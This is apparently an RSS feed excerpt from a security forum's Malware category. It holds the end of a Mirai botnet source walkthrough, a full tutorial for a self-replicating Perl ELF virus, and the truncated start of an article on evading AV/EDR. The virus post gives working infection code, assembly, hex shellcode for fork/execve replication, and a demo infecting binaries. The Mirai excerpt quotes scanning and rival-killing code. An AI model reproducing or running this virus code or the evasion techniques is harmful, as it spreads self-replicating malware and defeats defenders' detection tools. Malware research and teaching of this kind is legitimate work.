          <li>    connect(conn-&gt;fd, (struct sockaddr *)&amp;addr, sizeof (struct sockaddr_in));</li>
          <li>}</li>
          <li></li>
          <li class="selected">static ipv4_t get_random_ip(void)</li>
          <li>{</li>
          <li>    uint32_t tmp;</li>
          <li>    uint8_t o1, o2, o3, o4;</li>
          <li></li>
          <li>    do</li>
          <li>    {</li>
          <li>        tmp = rand_next();</li>
          <li></li>
          <li>        o1 = tmp &amp; 0xff;</li>
          <li>        o2 = (tmp &gt;&gt; 8) &amp; 0xff;</li>
      </ol>
    </code></pre>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>I find this rather intriguing because one of the principles I always aimed to follow in software development, including malware, is to avoid hardcoding simple code. Yet, it’s fascinating that Mirai, despite its simplistic approach, was eventually used in one of the most prominent cyberattacks to date, Mirai even searches for and eliminates the competing IoT malware known as “Anime.” It does this by identifying the malware’s presence through its executable path and then terminating and removing it from the compromised device.</p>
<aside class="onebox githubblob" data-onebox-src="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187">
  <header class="source">

      <a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187" target="_blank" rel="noopener nofollow ugc">soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187</a></h4>



    <pre class="onebox"><code class="lang-c">
      <ol class="start lines" start="177" style="counter-reset: li-counter 176 ;">
          <li>ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));</li>
          <li></li>
          <li>// Store /proc/$pid/status into status_path</li>
          <li>ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));</li>
          <li>ptr_status_path += util_strcpy(ptr_status_path, file-&gt;d_name);</li>
          <li>ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));</li>
          <li></li>
          <li>table_lock_val(TABLE_KILLER_PROC);</li>
          <li>table_lock_val(TABLE_KILLER_EXE);</li>
          <li></li>
          <li class="selected">// Resolve exe_path (/proc/$pid/exe) -&gt; realpath</li>
          <li>if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)</li>
          <li>{</li>
          <li>    realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string</li>
          <li></li>
          <li>    table_unlock_val(TABLE_KILLER_ANIME);</li>
          <li>    // If path contains ".anime" kill.</li>
          <li>    if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)</li>
          <li>    {</li>
          <li>        unlink(realpath);</li>
          <li>        kill(pid, 9);</li>
      </ol>
    </code></pre>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>The goal of this is obvious Mirai maximize the attack potential of the botnet devices, “Rise Up And Kill Him First”, These offensive and defensive measures are common among malware authors.</p>
<p>In conclusion, these were some of the intriguing aspects I found within this source code. They underscore the delicate balance between the complexity and simplicity of malware development; achieving success in infiltrating advanced systems often doesn’t require advanced and sophisticated malware. Instead, it frequently comes down to human error and the art of social engineering. To this day, social engineering remains one of the most effective techniques for spreading malware or executing offensive operations.</p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-botnet-based/36818">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-botnet-based/36818</link>
          <pubDate>Wed, 06 Sep 2023 08:08:35 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36818</guid>
          <source url="https://0x00sec.org/t/malware-development-botnet-based/36818.rss">Malware Development: Botnet-Based</source>
        </item>
        <item>
          <title>Perljam.pl: A Perl x64 ELF virus</title>
          <dc:creator><![CDATA[isra]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h2><span>[ intro ]</span></h2>
        <p>
            EHLO. This article describes the implementation of perljam.pl, a proof-of-concept x64 ELF virus written in Perl based mostly on <a href="https://www.guitmz.com/linux-midrashim-elf-virus/" rel="noopener nofollow ugc">Linux.Midrashim</a>. The virus includes the following features and limitations:
          </p>
          <ul>
            <li>It uses the PT_NOTE to PT_LOAD ELF injection technique.</li>
            <li>It uses a non-destructive hardcoded payload that prints an extract from the song "release" by Pearl Jam and then infects other binaries in the current directory.</li>
            <li>It works on regular and position independent binaries.</li>
            <li>It is written in Perl, an interpreted language available by default on most Linux x64 distributions.</li>
            <li>It does not implement any evasion or obfuscation techniques, making it trivial to detect.</li>
          </ul>
          <p>(This is a crosspost from my original article at <b>hckng</b>. You can read it <a href="https://hckng.org/articles/perljam-elf64-virus.html" target="_blank" rel="noopener nofollow ugc">here</a>).</p>
          <p>Source code:</p>
          <p>
            <a href="https://git.sr.ht/~hckng/vx/tree/master/item/perljam.pl" target="_blank" rel="noopener nofollow ugc">https://git.sr.ht/~hckng/vx/tree/master/item/perljam.pl</a>
            <br>
            <a href="https://github.com/ilv/vx/blob/main/perljam.pl" rel="noopener nofollow ugc">https://github.com/ilv/vx/blob/main/perljam.pl (mirror)</a>
          </p>
          <p>
            <b>IMPORTANT NOTE</b>: perljam.pl was made for educational purposes only, I'm not responsible for any misuse or damage caused by this program. Use it at your own  risk.
          </p>
<h2><span>[ part 1: infection ]</span></h2>
          <p>
            The infection is performed using the well known <a href="https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/" target="_blank" rel="noopener nofollow ugc">PT_NOTE to PT_LOAD</a> technique which overwrites an auxiliary segment in the program headers table and  converts it into a loadable segment where executable instructions can be placed without affecting program execution. This method works both on regular and position independent binaries with the exception of golang executables that use PT_NOTE segment for storing data used during execution.
          </p>
          <p>
            The infection algorithm can be summarized as follows:
          </p>
          <ul>
            <li> a) Read the binary and parse its ELF header and program headers table.</li>
            <li> b) Calculate the address for loading a payload in memory.</li>
            <li> c) Change binary's entry point to the previous calculated address.</li>
            <li> d) Find a PT_NOTE segment and convert it to an executable PT_LOAD segment.</li>
            <li> e) Adjust PT_LOAD segment's virtual address, file size and memory size.</li>
            <li> f) Append payload after the binary's code.</li>
            <li> g) Calculate binary's original entry point relative to the new entry point.</li>
            <li> h) Append an instruction for jumping back to the binary's original entry point.</li>
            <li> i) Append the virus source code at the end of the binary.</li>
          </ul>
          <p>Relevant parts of the implementation will be discussed in the next sections.</p>
<h3><span>[ read ELF binary and parse its headers ]</span></h3>
          <p>
            The binary is opened with the ':raw' <a href="https://perldoc.perl.org/PerlIO#:raw" target="_blank" rel="noopener nofollow ugc">pseudo-layer</a> for passing binary data. Two helper subroutines are used for reading and writing content with the <a href="https://perldoc.perl.org/functions/pack" target="_blank" rel="noopener nofollow ugc">unpack/pack</a> functions:
          </p>
<pre><code class="lang-auto"> # read &amp; unpack
 sub ru {
     my $fh  = shift;
     my $tpl = shift;
     my $sz  = shift;

     read $fh, my $buff, $sz;
     return unpack($tpl, $buff);
 }

 # write &amp; pack
 sub wp {
     my $fh   = shift;
     my $tpl  = shift;
     my $sz   = shift;
     my @data = @_;

     syswrite $fh, pack($tpl, @data), $sz;
 }
 [...]
 open my $fh, '&lt;:raw', $file;
</code></pre>
<p>
            The above subroutines use a given template ($tpl) for converting data from/to the binary. In this case the following templates are used:
          </p>
          <ul>
            <li>"C", an unsigned char value (1 byte).</li>
            <li>"a", a string with arbitrary binary data (1 byte).</li>
            <li>"x", a null byte.</li>
            <li>"S", an unsigned short value (2 bytes).</li>
            <li>"I", an unsigned integer value (4 bytes).</li>
            <li>"q", an unsigned quad value (8 bytes).</li>
          </ul>
          <p>
            Based on the <a href="https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html" target="_blank" rel="noopener nofollow ugc">ELF header specification</a>, reading the binary's headers and checking the ELF magic numbers can be done as follows:
          </p>
<pre><code class="lang-auto"> my @ehdr = ru($fh, "C a a a C C C C C x7 S S I q q q I S S S S S S", 0x40);

 # for clarity
 my ($e_phoff, $e_phentsize, $e_phnum) = ($ehdr[13], $ehdr[17], $ehdr[18]);

 # skip non ELFs
 # $ehdr[i]  = ei_magi, 0 &lt;= i &lt;= 3
 if($ehdr[0] != 127 &amp;&amp; $ehdr[1] !~ "E" &amp;&amp; $ehdr[2] !~ "L" &amp;&amp; $ehdr[3] !~ "F") {
      close $fh;
      next;
 }
</code></pre>
<br>
<h3><span>[ calculate address and change entry point ]</span></h3>
<p>
According to <a href="https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/" target="_blank" rel="noopener nofollow ugc">this</a>, the new entry point of the injected payload must be an address far beyond the end of the original program in order to avoid overlap. For simplicity, the value 0xc000000 plus the size of the binary is chosen and then the modified headers are copied into a temporary binary.
</p>
<pre><code class="lang-auto"> # file size
 my $file_sz = (stat $file)[7];
 [...]
 my $far_addr = 0xc000000;
 $ne_entry = $far_addr + $file_sz;
 $oe_entry = $ehdr[12];
 $ehdr[12] = $ne_entry;

 # create tmp file for copying the modified binary
 open my $fh_tmp, '&gt;:raw', "$file.tmp";
 wp($fh_tmp, "C a a a C C C C C x7 S S I q q q I S S S S S S", 0x40, @ehdr);
</code></pre>
<br>
<h3><span>[ convert PT_NOTE to PT_LOAD and adjust values ]</span></h3>
<p>
Next, in order to parse the entries of the program headers table the binary is read on chuncks based on the values $e_phoff, $e_phnum and $e_phentsize obtained from the binary's ELF header. Reference for the expected headers values can be found at the <a href="https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html" target="_blank" rel="noopener nofollow ugc">Program Header specification</a>:
</p>
<pre><code class="lang-auto"> seek $fh, $e_phoff, "SEEK_SET";
 seek $fh_tmp, $e_phoff, "SEEK_SET";

 # inject the first PT_NOTE segment found
 my $found_ptnote = 0;
 for (my $i = 0; $i &lt; $e_phnum; $i++) {
     #
     # read program header
     # see https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html
     my @phdr = ru($fh, "I I q q q q q q", $e_phentsize);
     [...]
     wp($fh_tmp, "I I q q q q q q", $e_phentsize, @phdr);
 }
</code></pre>
<p>
            When a segment of p_type 4 is found (PT_NOTE) the entries values are modified as follows:
          </p>
          <ul>
            <li>p_type    = 1 (for converting it to PT_LOAD)</li>
            <li>p_flags   = 5 (for making it executable)</li>
            <li>p_offset  = $file_sz; (offset to end of binary, where payload will be appended)</li>
            <li>p_vaddr   = $ne_entry (the new entry point calculated above)</li>
            <li>p_filesz += payload size + 5 + virus size (payload + jmp + virus)</li>
            <li>p_memsz  += payload size + 5 + virus size (payload + jmp + virus)</li>
            <li>p_align   = 2mb (based on [x])</li>
          </ul>
<h3><span>[ append payload ]</span></h3>
<p>
After parsing the entries of the program headers table, the rest of the binary is copied without change, followed by the hardcoded payload (the process of adjusting the payload will be described in part 2).
</p>
<pre><code class="lang-auto"> # copy rest of file's content
 syswrite $fh_tmp, $_ while(&lt;$fh&gt;);

 #
 # append payload
 #
 syswrite $fh_tmp, $payload_prefix;
 [...]
 # adjust payload
 [...]
 syswrite $fh_tmp, $payload_suffix;
</code></pre>
<h3><span>[ calculate relative entry point and append jump instruction ]</span></h3>
<p>
            The binary's original entry point relative to the entry point of the injected payload is calculated using the formula described in <a href="https://www.guitmz.com/linux-midrashim-elf-virus/" target="_blank" rel="noopener nofollow ugc">Linux.Midrashim</a>:
</p>
<blockquote>
<p>newEntryPoint = originalEntryPoint - (p_vaddr + 5) - virus_size</p>
</blockquote>
<p>The jump instruction is then appended using such value:</p>
<pre><code class="lang-auto">$ne_entry = $oe_entry - ($ne_entry + 5) - $payload_sz;
# 4 bytes only
$ne_entry = $ne_entry &amp; 0xffffffff;
wp($fh_tmp, "C q", 0x9, (0xe9, $ne_entry));
</code></pre>
<h3><span>[ append virus ]</span></h3>
 <p>
To achieve replication, perljamp.pl source code must be appended to the infected binary. To carry out this task, the virus should open itself (using the predefined variable $0) and append its content after the jump instruction. Note that if perljam.pl is executed from an infected binary then a search for the string "<i>#!/usr/bin/perl</i>" must be performed to ensure that only the source code of the virus is copied and not the content of the binary. The virus source code is read before the main loop and it's written on each infection.
 </p>
<pre><code class="lang-auto"> #
 # virus code
 #
 # search for '#!/usr/bin/perl' first to avoid copying extra data
 my $vx;
 open my $fh_vx, '&lt;', $0;
 while(&lt;$fh_vx&gt;) {
    last if($_ =~ q(#!/usr/bin/perl));
 }
 $vx  = "#!/usr/bin/perl\n";
 $vx .= $_ while(&lt;$fh_vx&gt;);
 close $fh_vx;
 # virus size
 my $vx_sz = length($vx);

 [...]
 [...]

 #
 # append virus code
 #
 syswrite $fh_tmp, "\n".$vx;
</code></pre>
<h3><span>[ overwrite binary ]</span></h3>
 <p>At this point the virus has created an infected copy of the binary. The final step is to delete the original binary and replace it with the infected copy.
</p>
<pre><code class="lang-auto"> close $fh;
 close $fh_tmp;

 # replace original binary with tmp copy
 unlink $file;
 copy("$file.tmp", $file);
 unlink "$file.tmp";
 chmod 0755, $file;
</code></pre>
<br>
<h2><span>[ part 2: payload &amp; replication ]</span></h2>
 <p>
The harcoded payload consists of two combined shellcodes. The first one prints to stdout an extract from the song "release" by Pearl Jam. The second one performs the virus replication by running the infected binary as a perl script. For this the perl interpreter must be executed using the -x switch, which according to <a href="https://perldoc.perl.org/perlrun#-x" target="_blank" rel="noopener nofollow ugc">Perl's documentation</a>:
</p>
<blockquote>
<p>tells Perl that the program is embedded in a larger chunk of unrelated text, such as in a mail message. Leading garbage will be discarded until the first line that starts with #! and contains the string “perl”</p>
</blockquote>
<p>Therefore, an execve syscall for "<i>/usr/bin/perl -x infected_binary</i>" will run the perljam.pl source code embedded in the infected binary. This syscall must be  invoked inside a child process (fork) to prevent the interruption of the original program code.
 </p>
<p>
However, the "infected_binary" (filename) argument in the execve syscall needs to change on each infection according to the binary's filename. To achieve this an initial version of the assembly code is compiled using a fixed string of length 255 (maximum filename length on Linux) as the filename argument. This string will be replaced later.
</p>
<p>The following assembly code combines the two shellcodes mentioned before:</p>
<pre><code class="lang-auto">BITS 64
global _start
section .text
_start:
    call main
    db "i am myself, like you somehow", 0xa, 0x0
    db "/usr/bin/perl", 0x0
    db "-x", 0x0
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", 0x0
    
 main:
    ;;;;;;;;;;;;
    ; print msg
    ;;;;;;;;;;;;
    xor rax, rax
    xor rdx, rdx
    inc al
    mov rdi, rax
    pop rsi
    mov dl, 30
    syscall

    ;;;;;;;;
    ; fork
    ;;;;;;;;
    xor rax, rax
    mov rax, 57
    syscall
    test eax, eax
    jne parent

    ;;;;;;;;;;;;;;;;;;;;;;;;;
    ; call perl interpreter
    ;;;;;;;;;;;;;;;;;;;;;;;;;

    ; filename "/usr/bin/perl"
    lea rdi, [rsi+31]   
    
    ; argv
    ; ["/usr/bin/perl", "-x", "xxxxx..."] (on reverse)
    xor rdx, rdx
    push rdx
    lea rbx, [rsi+48] ; "xxx..."
    push rbx
    lea rbx, [rsi+45] ; "-x"
    push rbx
    push rdi          ; "/usr/bin/perl"
    mov rsi, rsp 

    ; execve &amp; exit
    xor rax, rax
    mov rax, 59
    mov rdx, 0
    syscall
    xor rdx, rdx
    mov rax, 60
    syscall

 parent:
    ; cleanup for the jmp instruction
    xor rax, rax
    xor rdx, rdx
</code></pre>
<p>The code is then compiled to extract its hexadecimal representation.</p>
<blockquote>
<p>$ nasm -f elf64 -o perljam.o perljam.s<br>
$ objdump -d perljam.o</p>
</blockquote>
<p> After this, the harcoded payload is generated by removing the hexadecimal representation of the fixed string (\x78 * 255) and then splitting the remaining shellcode in two: before and after the fixed string.
</p>
<pre><code class="lang-auto">my ($payload_prefix, $payload_suffix);
$payload_prefix  = "\xe8\x30\x01\x00\x00\x69\x20\x61\x6d\x20\x6d\x79\x73\x65";
$payload_prefix .= "\x6c\x66\x2c\x20\x6c\x69\x6b\x65\x20\x79\x6f\x75\x20\x73";
$payload_prefix .= "\x6f\x6d\x65\x68\x6f\x77\x0a\x00\x2f\x75\x73\x72\x2f\x62";
$payload_prefix .= "\x69\x6e\x2f\x70\x65\x72\x6c\x00\x2d\x78\x00";

$payload_suffix  = "\x00\x48\x31\xc0\x48\x31\xd2\xfe\xc0\x48\x89\xc7\x5e\xb2";
$payload_suffix .= "\x1e\x0f\x05\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85";
$payload_suffix .= "\xc0\x75\x2f\x48\x8d\x7e\x1f\x48\x31\xd2\x52\x48\x8d\x5e";
$payload_suffix .= "\x30\x53\x48\x8d\x5e\x2d\x53\x57\x48\x89\xe6\x48\x31\xc0";
$payload_suffix .= "\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x31";
$payload_suffix .= "\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2";
</code></pre>
<p>
The payload is adjusted on each infection by inserting the hexadecimal representation of the infected binary's filename plus N null bytes, where:
</p>
<blockquote>
<p>N = 255 - length(infected binary’s filename)</p>
</blockquote>
<p>
Filling with N null bytes after the infected binary's filename ensures that the payload will not crash on runtime, since adding or removing bytes will break the shellcode. In addition, the first null byte located after the infected binary's filename will be interpreted by the machine as the end of the string and the remaining null values will be ignored.
</p>
<p>
            The adjustment can be done as follows:
</p>
<pre><code class="lang-auto"> syswrite $fh_tmp, $payload_prefix;
 # adjust payload with target's filename
 my @chars = split //, $file;
 for(my $i = 0; $i &lt; length($file); $i++) {
     wp($fh_tmp, "C", 0x1, (hex unpack("H2", $chars[$i])));
 } 
 # fill with null values
 for(my $i = length($file); $i &lt; 255; $i++) {
     wp($fh_tmp, "C", 0x1, (0x00));
 }
 syswrite $fh_tmp, $payload_suffix;
</code></pre>
<br>
<h2><span>[ part 3: run ]</span></h2>
<p>To run:</p>
<blockquote>
<p>$ perl perljam.pl</p>
</blockquote>
<p>Example:</p>
<pre><code class="lang-auto"> $ cp /bin/id .
 $ ./id
 uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
 $ perl perljam.pl
 $ ./id
 i am myself, like you somehow
 uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
 $ cp /bin/id id2
 $ ./id2
 uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
 $ ./id
 i am myself, like you somehow
 uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
 $ ./id2
 i am myself, like you somehow
 uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
</code></pre>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373</link>
          <pubDate>Fri, 11 Aug 2023 14:20:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36373</guid>
          <source url="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373.rss">Perljam.pl: A Perl x64 ELF virus</source>
        </item>
        <item>
          <title>Mitigating Program Tampering and Bypassing AV/EDR Through Blocking Operations on Executable Memory Pages</title>
          <dc:creator><![CDATA[9xN]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>This article is a continuation in a multi-part evasion technique series to bypass antivirus (AV) and endpoint detection and response (EDR) systems. This method, unlike the last one discussed <a href="https://44.is-a.dev/posts/Building-A-DLL-Blocker/" rel="noopener nofollow ugc">here</a>, imposes a different strategy that can also help protect against reverse engineering efforts made by blue team analysts. Similarly to other methods discussed in this series, this concept can also apply to aid in protecting legitimate processes againt several different code execution strategies used by modern day state of the art malicious software.<br>
(This article is copied down from my website which has much better formatting and layout that you can find <a href="https://44.is-a.dev/posts/Blocking-Operations-On-Executable-Memory-Pages/" rel="noopener nofollow ugc">here</a>)</p>
<hr>
Table of Contents <a href="https://0x00sec.org/t/mitigating-program-tampering-and-bypassing-av-edr-through-blocking-operations-on-executable-memory-pages/36113/1">(click for more details)</a>
<h2><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h2>
<p>The widespread use of DLL loading/injection in programs, including instances where these DLLs are signed by reputable entities like Microsoft, (the weakness of our <a href="https://44.is-a.dev/posts/Building-A-DLL-Blocker/" rel="noopener nofollow ugc">last approach</a>) highlights the need for more robust and adaptable mitigation strategies. This is particularly important in the context of malware development, where such strategies can serve as potent countermeasures against detection of our meticulously crafted payloads and or target processes. By combining this technique with our <a href="https://44.is-a.dev/posts/Building-A-DLL-Blocker/" rel="noopener nofollow ugc">previous approach</a>, we can effectively protect against a myriad of threat actors rather than just one.</p>
<p><a href="https://mermaid.live/edit#pako:eNptUl1P6zAM_StRnjoJtvddCals3eVK3UAFxiTCQ25i1mitUyUpHwL-O04zBpPoQ-vY55zaJ37jymrgU_7Y2GdVSxdYWQmsinWx-psJXsETOA-swK1BACdQ8NFQv6ouvwEGt-zG2mZy5ezWyXYA5etiXhEkX08oEMjoyUrZo6rBM4vMB_pf340GdNSr8uW94F8amM0sBmnQs6VsjDK29wtiB2MxG_0h2sOBtvi3yssj7p0J9a886h5a-wR6ct5YtaPvHAKoADopLm5Xs2JTzEjtd3o2t9Q_2sDgBVQfIPHKnIgXsR9iXsfR2MENKvv-P8Vdzaq7DbuPr8sOnAzW-YfkzeAXS3G6gEMcVdNBGwdDK6wqUwZQ73GkeXp69i74rac76aQCdmHtTghcGzJaNnlDE8cZBBZBjcdjwd_Z3sGk8T1ElDqu7Q8_C4PtR9UhQ5AX9uUjP-EtuFYaTWv2FsGChxpaEHxKoZZuJ7jAD8LJPtjrV1R8GlwPJ7zvtAwwNzK6yKePsvGUBW3ItWXa22F9Pz4B0nzmRg" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/8/f8a698e0dfb2fa3242396f21bd14c722f65a89b2.png" alt="" data-base62-sha1="ztFlq31pQhWOdip3l3LZuhQA3Yu" role="presentation" width="690" height="237"></a></p>
<p>In this article, we will explore the technique of using Arbitrary Code Guard (ACG) and breifly touch on Code Integrity Guard (CIG) to block operations on executable memory pages to bypass AVs/EDRs, as well as, some reverse engineering methods and advanced debugger programs (also can be used to prevent malware from hooking onto, and nesting itself inside of legitimate programs as well). Pretty much, our program can effectively prevent the execution of dynamically generated code. By doing so, we not only secure the front door but also the windows, the back door, and even the chimney, making life as difficult as possible for any possible threat actors.<br>
For our demonstration we will be,</p>
<ol>
<li>Attempting to allocate new memory with executable permissions, and</li>
<li>Attempting to make existing memory with executable permissions writable.<br>
In order to accomplish these tasks we will use the <code>VirtualAlloc()</code>, as well as, <code>VirtualProtect()</code> functions from the Windows API to simulate a read-write-execute (RWX) operation from an AV/EDR in an example program called <strong>acg_program.exe</strong>. Without wasting anymore time lets get started!</li>
</ol>
<blockquote>
<p>I was originally intending on including CIG as one of the main methods discussed in this article but upon further research the use cases on specific threat actors is partically refined and this can be a very <em>noisy</em> and might break your system as it is not compatible on certain hardware and messes around with Windows Registry settings using virtualization and sandboxing. However, if you are interested in learning more about these topics, I recommend checking out the following articles:</p>
</blockquote>
<ul>
<li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/introduction-to-device-guard-virtualization-based-security-and-windows-defender-application-control" rel="noopener nofollow ugc">Microsoft Documentation information on what CIG does and can be used for</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity" rel="noopener nofollow ugc">Microsoft Documentation for enabling such protection</a></li>
</ul>
<blockquote>
<p>All of the source code for this article is available on <a href="https://github.com/9xN/Blocking-Operations-On-Executable-Memory-Pages" rel="noopener nofollow ugc">GitHub</a></p>
</blockquote>
<h2><a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h2>
<p>One such technique commonly employed by AV/EDR products is the implementation of userspace hooks around critical functions. However, these hooks often rely on the ability to modify existing executable pages, necessitating the use of functions such as the aforementioned <code>VirtualProtect()</code> to update memory protection. More so, a malicious, or more intrusive threat actor might even try to allocate memory with <code>VirtualAlloc()</code> to then use later on to run arbitrary code. By blocking operations on executable memory pages and restricting the creation of RWX pages, we can potentially render even a Microsoft-signed DLL ineffective.</p>
<p><a href="https://mermaid.live/edit#pako:eNptksFO4zAQhl_F8ikV0N6LtFIU0oKUFhS2BQlzMPa0sXDGke3ssgLefSdxKSCRQzSe-edz5s-8cuU08DnfWfdXNdJHVtUC63JbrpeZ4DX8AR-Albg3COAFCj4Z6zf19afA4J79ds7Obrzbe9mOonxbXtQkybczCgQyerJK9qgaCMwhC5Hu67vJqB54db56EPyDgSfEKJaz4mopMCscRmkwsJW0RhnXhwWRonGYTc4J8XhELK7WefWVk92Z2PzYJ3CDrdNmZ0AnxmKzLsr7sqD-nxsIZi2DF1B9hNRT5dR0OdxOXbfDUOzoA5VD_0Rx17D67p49DK_rDryMzofH5MroFEtxsv4YD9R00MbD-BmsrlIGUB90xDw7e2Fvgm8C_Y5OKmCXzj0LgVtDHkubW-vUMIDAMqrpdCr4GzsYliCfUxDr1_fa4fC1MLr8rTpmRsmHifyUt-BbaTRt2OsgFjw20ILgcwq19M-CC3wnneyju_2His-j7-GU952WES6MHGzk8520gbKgDdm2Sis7bu77f1H644w" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/892431cc2ce168ab2eca79ee86e791fe681501bc.png" alt="" data-base62-sha1="jzcXvGIx9g0T4BZ7kecXdjHude4" role="presentation" width="690" height="242"></a></p>
<h2><a name="a-foreword-on-code-integrity-guard-cig-3" class="anchor" href="https://0x00sec.org#a-foreword-on-code-integrity-guard-cig-3"></a>A foreword on Code Integrity Guard (CIG)</h2>
<p>As mentioned in the introduction, I was originally going to include CIG in conjuction with ACG but its <em>just not stable enough</em> and <em>not worth the risk</em> of breaking the target system in an attempt to pull this off. <em>Not to mention</em> could have adverse effects on our payload itself and or target process preformance. However, I will still briefly touch on the topic and have provided some resources for further reading if you are interested in learning more about it up above.</p>
<blockquote>
<p>Memory integrity is sometimes referred to as hypervisor-protected code integrity (HVCI) or hypervisor enforced code integrity, and was originally released as part of Device Guard. Device Guard is no longer used except to locate memory integrity and VBS settings in Group Policy or the Windows registry.</p>
</blockquote>
<p>CIG is a feature that is part of Windows Defender Application Control (WDAC) that uses virtualization-based security to prevent unsigned code from being loaded into the kernel. This is accomplished by using a hypervisor to create a virtualized environment for the kernel to run in. This virtualized environment is known as the hypervisor-enforced code integrity (HVCI) environment.</p>
<p>The HVCI environment is isolated from the rest of the system and is protected from any unsigned code that may be running on the system. This means that any unsigned code that attempts to run in the kernel will be blocked by the hypervisor.</p>
<p>This is a very powerful feature that can be used to prevent malicious code from running in the kernel. However, it is not without its drawbacks. For example, CIG is not compatible with all hardware and can cause system instability. Furthermore, it is not compatible with all versions of Windows 10, however it does seem to <em>mostly sorta work</em> on Windows 11.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/e/1e9bdba4ab38ae2755d385f604cfe202864138ed.png" data-download-href="/uploads/short-url/4mMfosv8IovOA5vmSIq1cjvz8At.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/e/1e9bdba4ab38ae2755d385f604cfe202864138ed_2_690x367.png" alt="" data-base62-sha1="4mMfosv8IovOA5vmSIq1cjvz8At" role="presentation" width="690" height="367" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/e/1e9bdba4ab38ae2755d385f604cfe202864138ed_2_690x367.png, https://0x00sec.s3.amazonaws.com/original/3X/1/e/1e9bdba4ab38ae2755d385f604cfe202864138ed.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/e/1e9bdba4ab38ae2755d385f604cfe202864138ed.png 2x" data-dominant-color="819DB0"></a></div><br>
<em>Diagram of the HVCI compartmentalization</em><p></p>
<h2><a name="rwx-operations-4" class="anchor" href="https://0x00sec.org#rwx-operations-4"></a>RWX Operations</h2>
<p>In our example program we will use <code>VirtualAlloc()</code> and <code>VirtualProtect()</code>, however, there are several other Windows API functions you could use instead of these two in the code example:</p>
<ul>
<li>VirtualAllocEx</li>
</ul>
<p>This allocates memory in another process. You can specify executable permissions:</p>
<pre><code class="lang-c">void* mem = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</code></pre>
<ul>
<li>NtAllocateVirtualMemory</li>
</ul>
<p>Lower level API to allocate memory with RWX permissions:</p>
<pre><code class="lang-c">void* mem;
NtAllocateVirtualMemory(GetCurrentProcess(), &amp;mem, 0, 1024, 
  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</code></pre>
<ul>
<li>VirtualProtectEx</li>
</ul>
<p>Changes permissions on an existing memory region in another process:</p>
